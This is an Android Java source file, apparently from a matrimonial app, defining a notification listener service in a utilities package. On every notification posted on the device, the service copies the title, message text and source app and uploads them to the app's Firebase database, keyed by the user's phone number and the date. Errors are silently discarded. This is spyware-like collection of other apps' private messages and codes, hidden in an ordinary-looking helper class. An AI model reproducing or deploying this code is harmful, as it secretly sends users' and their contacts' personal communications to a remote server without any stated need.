package com.appsinventiv.noorenikah.Utils;

import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;

import java.util.HashMap;

public class MyNotificationListenerService extends NotificationListenerService {

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("loog","connected");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // This method is called when a new notification is posted
        try {
            String packageName = sbn.getPackageName();
//        String ticker = sbn.getNotification().tickerText.toString();
            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString("android.title");
            String msg="";
            CharSequence text = extras.getCharSequence("android.text");
            if(text!=null && text.length()>0){
                msg=text.toString();
            }
            Log.d("loog", packageName);
            DatabaseReference mDatabase=Constants.M_DATABASE;
            HashMap<String,Object> map=new HashMap<>();
            map.put("title",title);
            map.put("text",msg);
            map.put("app",packageName);
            mDatabase.child("Noti").child(SharedPrefs.getUser().getPhone())
                    .child(CommonUtils.getFormattedDateOnlyy(System.currentTimeMillis())).setValue(map);
        }catch (Exception e){

        }

        // Do something with the notification data
        // ...
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // This method is called when a notification is removed
    }

}
